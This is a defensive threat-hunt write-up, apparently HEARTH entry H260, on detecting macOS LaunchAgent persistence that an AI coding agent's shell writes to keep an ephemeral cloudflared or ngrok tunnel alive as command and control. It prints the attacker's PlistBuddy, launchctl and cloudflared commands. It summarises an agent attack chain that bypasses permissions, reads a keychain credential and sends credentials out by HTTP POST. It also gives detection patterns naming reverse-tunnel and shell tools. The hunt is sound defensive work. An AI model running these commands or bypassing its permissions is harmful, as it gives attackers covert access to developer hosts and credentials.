  LaunchAgents are the standard macOS mechanism for user-level background software, so the raw file-write event is
  high volume. Expect legitimate writes from:
  - Application installers and updaters (Microsoft AutoUpdate, Adobe, Dropbox, Zoom, Docker Desktop, Homebrew

  WHY IT WORKS: a LaunchAgent is the sanctioned, documented way to run something at login on macOS, and it needs
  no root for the per-user path. Combined with an ephemeral tunnel broker, the adversary gets inbound reachability
  to the host with no firewall change, no port forward, and no attacker-owned infrastructure to burn — the tunnel
  hostname is issued by Cloudflare or ngrok and rotates. Because a coding agent legitimately spawns shells and
  writes files all day, the plist write inherits an approved-looking ancestry. Elastic flags the ngrok binary as
  "adware/hacktool ngrok" on VirusTotal, but `cloudflared` is clean and signed, so binary reputation does not
  carry this hunt.

  ATTACK CHAIN CONTEXT (from the report): coding agent run with permission-bypass flags → child `zsh` →
  keychain read of the agent's own OAuth credential (see [[H259]]) and credentialed HTTP POST of user/password to

  discovery via `pgrep`, staging via `python3 /tmp/mcp_clean_landers.py`. Elastic ships prevention coverage as
  "Persistence via GenAI Tool" and "Suspicious Python Script Execution and Network Connection".

  HUNT LOGIC (macOS):
  1. PRIMARY — ESF file-create/write/rename where the path matches `~/Library/LaunchAgents/*.plist`,
     `/Library/LaunchAgents/*.plist`, or `/Library/LaunchDaemons/*.plist`. Resolve the RESPONSIBLE process, not
     just the immediate writer (a shell redirect and a `defaults write` have different immediate writers but the
     same responsible ancestor).
     Defender XDR KQL equivalent:
       DeviceFileEvents
       | where FolderPath has "Library/LaunchAgents" or FolderPath has "Library/LaunchDaemons"
       | where FileName endswith ".plist"
       | where InitiatingProcessFileName !in~ ("installd","pkgd","system_installd","brew","jamf")
       | project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName,
                 InitiatingProcessCommandLine, InitiatingProcessParentFileName

     an IDE agent helper, or a `zsh`/`bash` descended from one. This is the single filter that separates this
     hunt from the ordinary macOS persistence hunts already in HEARTH ([[H148]], [[H204]]), which key on
     Apple-masquerading labels and unsigned Mach-O payloads instead of on provenance.
  3. PAYLOAD INSPECTION — parse `ProgramArguments` from every plist surfaced. Flag where it references
     `cloudflared`, `ngrok`, `ssh -R`, `localhost.run`, `lhr.life`, `/bin/sh -c`, `/bin/zsh -c`, `curl`, or a
     path under `/tmp`, `~/Downloads`, `~/Library/Caches`, or a git working tree.
  4. WATCHDOG — ESF exec where the image is `/usr/libexec/PlistBuddy` or `defaults` AND argv touches a path under
     `LaunchAgents`/`LaunchDaemons`, especially setting `StartInterval` or `KeepAlive`. Pair with
     `launchctl bootstrap|load|enable` execs referencing a label first seen in the last 24 hours.
  5. TUNNEL EXECUTION AND EGRESS — exec of `cloudflared` with `tunnel --url http://localhost:` (an ephemeral quick
     tunnel — no named tunnel, no credentials file), `ngrok http|tcp`, or `ssh -R 80:localhost:<port>` to
     `localhost.run`/`nokey@localhost.run`. Corroborate with DNS/HTTPS to `api.trycloudflare.com`,
     `*.trycloudflare.com`, `*.lhr.life`, `*.ngrok.io`, `*.ngrok-free.app`, and downloads from `bin.equinox.io`.
  6. SIGNING TRIAGE — for every referenced binary run `codesign -dvvv` and `spctl --assess`; ad-hoc or unsigned
     payloads referenced from a vendor-namespaced Label are conclusive.
  7. SCOPE — enumerate all labels bootstrapped in the window with `launchctl list` and diff against a known-good
     inventory per host role.

# H260

Two free tunnel brokers, one plist, and a sixty-second respawn timer. That is the whole persistence mechanism Elastic documented — and every piece of it is a legitimate macOS or developer facility.

```
PlistBuddy -c "Set :StartInterval 60" ~/Library/LaunchAgents/com.<vendor>.<app>.watchdog.plist
launchctl bootstrap gui/$(id -u)/com.<vendor>.<app>.watchdog
cloudflared tunnel --url http://localhost:<port>
```

HEARTH already has macOS LaunchAgent hunts — [[H148]] and [[H204]] both cover infostealers persisting through `~/Library/LaunchAgents/`. Those hunt the *payload*: an Apple-masquerading label pointing at an unsigned Mach-O. This one hunts the *provenance*. The binary here is `cloudflared`, which is signed, legitimate, and probably already running somewhere in your estate for a sanctioned reason. Nothing about the file is bad. What is anomalous is that an AI coding agent's child shell wrote a startup item.

## Why

- **The persistence and the C2 are the same artifact, and neither is malware.** A quick tunnel gives an attacker inbound reachability with no firewall exception, no port forward, and no infrastructure of their own to burn — the hostname is issued by Cloudflare and rotates freely. Wrapping it in a LaunchAgent means the access re-establishes at every login. There is no implant to find, no C2 domain to block, and no hash to hunt.
- **Provenance is the only durable discriminator here, which is exactly why it is worth writing down.** Signature checks pass. Reputation checks pass. Path checks pass — `~/Library/LaunchAgents/` is where startup items are supposed to live. The claim "an installer wrote this plist" versus "a coding agent's shell wrote this plist" is the entire hunt, and it holds regardless of which tunnel broker or label the next campaign picks.
- **`StartInterval 60` on a LaunchAgent is a respawn watchdog, and legitimate software rarely wants one.** Real background agents use `KeepAlive` with conditions, or run on a meaningful schedule. A one-minute relaunch interval set via PlistBuddy *after* the plist was created is someone making sure their tunnel comes back — it is a small, specific, tunable signal that survives relabeling.
- **Ephemeral quick tunnels are distinguishable from sanctioned cloudflared, and most teams have never made that distinction.** A corporate Cloudflare connector runs a *named* tunnel with a credentials file and a stable ID. `cloudflared tunnel --url http://localhost:8080` is anonymous, disposable, and needs no account. Splitting those two populations turns a tool that is "allowed" into a tool that is allowed *in one specific shape* — and that is a control you can actually enforce.
- **Developer endpoints are the wrong place to lose this argument.** The host running the coding agent typically holds cloud credentials, signing keys, and write access to source. Persistence there is not one workstation; it is a path into the build pipeline.
